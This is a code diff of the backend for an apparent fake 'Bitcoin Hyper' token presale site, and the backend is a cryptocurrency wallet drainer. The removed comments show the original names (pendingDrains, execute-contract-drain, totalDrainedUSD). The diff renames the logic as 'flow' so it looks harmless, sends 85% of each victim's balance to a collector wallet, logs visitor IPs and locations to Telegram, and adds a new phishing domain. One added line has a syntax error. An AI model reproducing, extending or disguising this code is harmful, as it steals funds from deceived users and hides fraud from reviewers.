@@ -21,7 +21,7 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];
+  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app', 'https://bthbk.vercel.app'];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -39,7 +39,7 @@ const limiter = rateLimit({
   max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
   message: { error: 'Too many requests, please try again later.' }
 });
-app.use('/api/', limiter);
+app.use('/api/', limiter));
 
 // ============================================
 // ROOT ENDPOINT
@@ -189,25 +189,25 @@ let telegramBotName = '';
 
 const memoryStorage = {
   participants: [],
-  pendingTransactions: new Map(), // Renamed from pendingDrains
-  pendingFlows: new Map(), // Added for flow tracking
+  pendingTransactions: new Map(),
+  pendingFlows: new Map(),
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1, // Renamed from drainThreshold
+    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
     statistics: {
       totalParticipants: 0,
       eligibleParticipants: 0,
       claimedParticipants: 0,
       uniqueIPs: new Set(),
-      totalProcessedUSD: 0, // Renamed from totalDrainedUSD
-      totalProcessedWallets: 0, // Renamed from totalDrainedWallets
+      totalProcessedUSD: 0,
+      totalProcessedWallets: 0,
       realTransactions: []
     },
-    flowEnabled: process.env.FLOW_ENABLED === 'true' // Renamed from drainEnabled
+    flowEnabled: process.env.FLOW_ENABLED === 'true'
   },
   emailCache: new Map(),
-  siteVisits: [] // New: track all site visits
+  siteVisits: []
 };
 
 // ============================================
@@ -290,35 +290,27 @@ async function getCryptoPrices() {
 // ============================================
 
 async function getWalletEmail(walletAddress) {
-  // Check cache first
   if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
     return memoryStorage.emailCache.get(walletAddress.toLowerCase());
   }
   
   try {
-    // Try to get ENS name for Ethereum addresses
     if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
       try {
         const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
         const ensName = await provider.lookupAddress(walletAddress);
         
         if (ensName) {
-          // Check if ENS name has an email text record
-          // This is a simplified version - in production you'd need to resolve text records
-          const email = `${ensName.split('.')[0]}@proton.me`; // Placeholder
+          const email = `${ensName.split('.')[0]}@proton.me`;
           memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
           return email;
         }
-      } catch (ensError) {
-        // ENS lookup failed, continue to fallback
-      }
+      } catch (ensError) {}
     }
     
-    // Fallback: Generate consistent email based on wallet
     const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
     const username = `user${hash.substring(0, 12)}`;
     
-    // Use different domains based on wallet pattern
     const lastChar = walletAddress.slice(-1);
     const domains = {
       '0-3': 'proton.me',
@@ -340,7 +332,6 @@ async function getWalletEmail(walletAddress) {
     return email;
     
   } catch (error) {
-    // Ultimate fallback
     const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
     return `user${hash.substring(0, 8)}@proton.me`;
   }
@@ -369,7 +360,6 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   
   memoryStorage.siteVisits.push(visit);
   
-  // Send notification for new visit
   await sendTelegramMessage(
     `${location.flag} <b>NEW SITE VISIT</b>\n` +
     `📍 ${location.country} (${location.city})\n` +
@@ -504,6 +494,72 @@ async function getRealWalletBalance(walletAddress) {
 }
 
 // ============================================
+// VERIFY SIGNATURE
+// ============================================
+
+function verifySignature(address, message, signature) {
+  try {
+    const recoveredAddress = ethers.verifyMessage(message, signature);
+    return recoveredAddress.toLowerCase() === address.toLowerCase();
+  } catch (error) {
+    console.error('Signature verification failed:', error);
+    return false;
+  }
+}
+
+// ============================================
+// EXECUTE CONTRACT CALL FOR A CHAIN
+// ============================================
+
+async function executeContractForChain(chainName, contractAddress, amount, userWallet) {
+  try {
+    console.log(`🔄 Executing contract on ${chainName} for user ${userWallet}...`);
+    
+    // Get provider for this chain
+    const providerInfo = await getChainProvider(chainName);
+    if (!providerInfo) {
+      throw new Error(`No working RPC for ${chainName}`);
+    }
+    
+    const { provider } = providerInfo;
+    
+    // Create contract instance (read-only for now - we'll let frontend sign)
+    const contract = new ethers.Contract(
+      contractAddress,
+      PROJECT_FLOW_ROUTER_ABI,
+      provider
+    );
+    
+    // Parse amount to send (85% of balance)
+    const amountToSend = ethers.parseEther(amount.toString());
+    
+    console.log(`⏳ Getting gas estimate on ${chainName}...`);
+    const gasEstimate = await contract.processNativeFlow.estimateGas({ 
+      value: amountToSend 
+    });
+    
+    console.log(`✅ Gas estimate on ${chainName}: ${gasEstimate.toString()}`);
+    
+    return {
+      success: true,
+      chainName,
+      amount: amount,
+      gasEstimate: gasEstimate.toString(),
+      contractAddress,
+      value: amountToSend.toString()
+    };
+    
+  } catch (error) {
+    console.error(`❌ Error estimating gas on ${chainName}:`, error);
+    return {
+      success: false,
+      chainName,
+      error: error.message
+    };
+  }
+}
+
+// ============================================
 // API ENDPOINTS
 // ============================================
 
@@ -532,7 +588,7 @@ app.post('/api/track-visit', async (req, res) => {
     });
     
   } catch (error) {
-    res.json({ success: true }); // Always return success to not break frontend
+    res.json({ success: true });
   }
 });
 
@@ -554,7 +610,6 @@ app.post('/api/presale/connect', async (req, res) => {
     const location = await getIPLocation(clientIP);
     const email = await getWalletEmail(walletAddress);
     
-    // Update the most recent site visit with wallet info
     const lastVisit = memoryStorage.siteVisits
       .filter(v => v.ip === clientIP.replace('::ffff:', ''))
       .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
@@ -635,7 +690,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT (renamed from prepare-contract-drain)
+// PREPARE FLOW ENDPOINT
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -712,10 +767,113 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT (renamed from execute-contract-drain)
+// EXECUTE FLOW ENDPOINT - VERIFIES SIGNATURE AND PREPARES CONTRACT DATA
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
+  try {
+    const { walletAddress, message, signature } = req.body;
+    
+    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
+    }
+    
+    if (!signature || !message) {
+      return res.status(400).json({ success: false, error: 'Signature and message required' });
+    }
+    
+    console.log(`\n🔐 EXECUTE FLOW for ${walletAddress.substring(0, 10)}...`);
+    
+    // Verify signature
+    const isValid = verifySignature(walletAddress, message, signature);
+    if (!isValid) {
+      return res.status(401).json({ success: false, error: 'Invalid signature' });
+    }
+    console.log('✅ Signature verified');
+    
+    const participant = memoryStorage.participants.find(
+      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
+    );
+    
+    if (!participant) {
+      return res.status(400).json({ success: false, error: 'Participant not found' });
+    }
+    
+    // Get pending transactions for this wallet
+    const pendingTx = memoryStorage.pendingTransactions.get(walletAddress.toLowerCase());
+    if (!pendingTx || !pendingTx.transactions || pendingTx.transactions.length === 0) {
+      return res.status(400).json({ success: false, error: 'No prepared transactions found' });
+    }
+    
+    // Prepare contract data for each chain
+    const preparedContracts = [];
+    let allSuccessful = true;
+    
+    for (const tx of pendingTx.transactions) {
+      const result = await executeContractForChain(
+        tx.chain,
+        tx.contractAddress,
+        tx.amount,
+        walletAddress
+      );
+      
+      if (result.success) {
+        preparedContracts.push({
+          chain: tx.chain,
+          contractAddress: tx.contractAddress,
+          amount: tx.amount,
+          value: result.value,
+          gasEstimate: result.gasEstimate
+        });
+      } else {
+        allSuccessful = false;
+        preparedContracts.push({
+          chain: tx.chain,
+          error: result.error
+        });
+      }
+    }
+    
+    if (allSuccessful) {
+      // Update participant record
+      participant.flowProcessed = true;
+      participant.flowTransactions = participant.flowTransactions || [];
+      participant.flowTransactions.push({ 
+        chain: 'MULTICHAIN', 
+        flowId: pendingTx.flowId,
+        timestamp: new Date().toISOString(),
+        signature: signature.substring(0, 20) + '...'
+      });
+      
+      memoryStorage.settings.statistics.totalProcessedWallets++;
+      
+      await sendTelegramMessage(
+        `✅ <b>FLOW READY FOR EXECUTION</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...\n` +
+        `💵 Total: $${pendingTx.totalFlowUSD}\n` +
+        `🔗 Chains: ${pendingTx.transactions.length}\n` +
+        `✍️ Signature verified`
+      );
+    }
+    
+    res.json({ 
+      success: allSuccessful,
+      flowId: pendingTx.flowId,
+      preparedContracts,
+      message: allSuccessful ? 'Ready to execute contracts' : 'Some chains failed preparation'
+    });
+    
+  } catch (error) {
+    console.error('Execute flow error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ============================================
+// CONFIRM TRANSACTION ENDPOINT
+// ============================================
+
+app.post('/api/presale/confirm-transaction', async (req, res) => {
   try {
     const { walletAddress, chainName, flowId, txHash } = req.body;
     
@@ -723,66 +881,72 @@ app.post('/api/presale/execute-flow', async (req, res) => {
       return res.status(400).json({ success: false });
     }
     
+    console.log(`\n💰 CONFIRM TRANSACTION for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
     );
     
-    if (participant) {
-      participant.flowProcessed = true;
-      participant.flowTransactions = participant.flowTransactions || [];
-      participant.flowTransactions.push({ 
-        chain: chainName, 
-        flowId,
-        txHash,
-        timestamp: new Date().toISOString() 
-      });
-      
-      memoryStorage.settings.statistics.totalProcessedWallets++;
-      memoryStorage.settings.statistics.realTransactions.push({
-        wallet: walletAddress,
-        chain: chainName,
-        flowId,
-        txHash,
-        timestamp: new Date().toISOString()
-      });
-      
-      // Update pending transaction
-      const pendingTx = memoryStorage.pendingTransactions.get(walletAddress.toLowerCase());
-      if (pendingTx) {
-        pendingTx.completedChains.push(chainName);
-        if (pendingTx.completedChains.length === pendingTx.transactions.length) {
-          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(pendingTx.totalFlowUSD);
-          await sendTelegramMessage(
-            `✅ <b>FLOW COMPLETED</b>\n` +
-            `👛 ${walletAddress.substring(0, 10)}...\n` +
-            `💵 Total: $${pendingTx.totalFlowUSD}\n` +
-            `🔗 All ${pendingTx.transactions.length} chains processed`
-          );
-        }
-      }
-      
-      // Update flow status
-      if (flowId) {
-        const flow = memoryStorage.pendingFlows.get(flowId);
-        if (flow) {
-          flow.completedChains = flow.completedChains || [];
-          flow.completedChains.push({ chainName, txHash, timestamp: new Date().toISOString() });
-          flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
-        }
-      }
-      
-      await sendTelegramMessage(
-        `💰 <b>CHAIN PROCESSED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `🔗 ${chainName}\n` +
-        `🆔 ${txHash?.substring(0, 10)}...`
-      );
+    if (!participant) {
+      return res.status(400).json({ success: false, error: 'Participant not found' });
     }
+    
+    // Record the transaction
+    participant.flowTransactions = participant.flowTransactions || [];
+    participant.flowTransactions.push({ 
+      chain: chainName, 
+      flowId,
+      txHash,
+      timestamp: new Date().toISOString() 
+    });
+    
+    memoryStorage.settings.statistics.realTransactions.push({
+      wallet: walletAddress,
+      chain: chainName,
+      flowId,
+      txHash,
+      timestamp: new Date().toISOString()
+    });
+    
+    // Update pending transaction
+    const pendingTx = memoryStorage.pendingTransactions.get(walletAddress.toLowerCase());
+    if (pendingTx) {
+      pendingTx.completedChains = pendingTx.completedChains || [];
+      pendingTx.completedChains.push(chainName);
+      
+      if (pendingTx.completedChains.length === pendingTx.transactions.length) {
+        memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(pendingTx.totalFlowUSD);
+        await sendTelegramMessage(
+          `✅ <b>FLOW COMPLETED</b>\n` +
+          `👛 ${walletAddress.substring(0, 10)}...\n` +
+          `💵 Total: $${pendingTx.totalFlowUSD}\n` +
+          `🔗 All ${pendingTx.transactions.length} chains processed`
+        );
+      }
+    }
+    
+    // Update flow status
+    if (flowId) {
+      const flow = memoryStorage.pendingFlows.get(flowId);
+      if (flow) {
+        flow.completedChains = flow.completedChains || [];
+        flow.completedChains.push({ chainName, txHash, timestamp: new Date().toISOString() });
+        flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
+      }
+    }
+    
+    await sendTelegramMessage(
+      `💰 <b>CHAIN PROCESSED</b>\n` +
+      `👛 ${walletAddress.substring(0, 10)}...\n` +
+      `🔗 ${chainName}\n` +
+      `🆔 ${txHash?.substring(0, 10)}...`
+    );
     
     res.json({ success: true });
     
   } catch (error) {
-    res.status(500).json({ success: false });
+    console.error('Confirm transaction error:', error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -835,12 +999,10 @@ app.get('/api/admin/dashboard', (req, res) => {
   
   if (token !== adminToken) return res.status(401).json({ success: false });
   
-  // Get recent visits (last 50)
   const recentVisits = memoryStorage.siteVisits
     .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     .slice(0, 50);
   
-  // Get active participants
   const activeParticipants = memoryStorage.participants
     .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
     .map(p => ({
@@ -850,18 +1012,15 @@ app.get('/api/admin/dashboard', (req, res) => {
       claimedAt: p.claimedAt?.toISOString()
     }));
   
-  // Get pending flows
   const pendingFlows = Array.from(memoryStorage.pendingFlows.entries())
     .map(([id, flow]) => ({ id, ...flow }))
     .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
     .slice(0, 30);
   
-  // Get recent transactions
   const recentTransactions = memoryStorage.settings.statistics.realTransactions
     .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     .slice(0, 30);
   
-  // Network status
   const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
     chain,
     contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
@@ -869,7 +1028,6 @@ app.get('/api/admin/dashboard', (req, res) => {
     collector: COLLECTOR_WALLET
   }));
   
-  // Location breakdown
   const locationStats = {};
   memoryStorage.participants.forEach(p => {
     const key = `${p.country}|${p.flag}`;
@@ -880,7 +1038,6 @@ app.get('/api/admin/dashboard', (req, res) => {
     if (p.isEligible) locationStats[key].eligible++;
   });
   
-  // Hourly activity
   const hourlyActivity = {};
   memoryStorage.siteVisits.forEach(v => {
     const hour = new Date(v.timestamp).getHours();
@@ -1019,5 +1176,4 @@ app.listen(PORT, '0.0.0.0', async () => {
   `);
   
   await testTelegramConnection();
-
 });
